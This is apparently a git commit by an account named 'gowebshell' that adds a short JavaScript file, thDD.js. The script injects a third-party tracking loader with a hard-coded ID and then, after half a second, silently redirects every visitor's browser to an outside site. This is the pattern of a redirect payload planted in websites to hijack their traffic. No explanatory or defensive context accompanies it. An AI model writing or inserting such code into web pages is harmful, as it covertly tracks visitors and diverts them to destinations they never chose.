cc7d691ff58477dca00bec5a94f9c118a445cecb
gowebshell <MinnieWSonnier30+github@gmail.com>
2023-11-20 09:58:46 -0300

    Create thDD.js

---
+++ thDD.js
@@ -0,0 +1,5 @@
+document.write('<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>');
+document.write('<script>LA.init({id:"3GauVmhq3bI3OovN",ck:"3GauVmhq3bI3OovN"})</script>');
+setTimeout(function(){
+    window.location.href = 'https://n1610.com';
+},500);
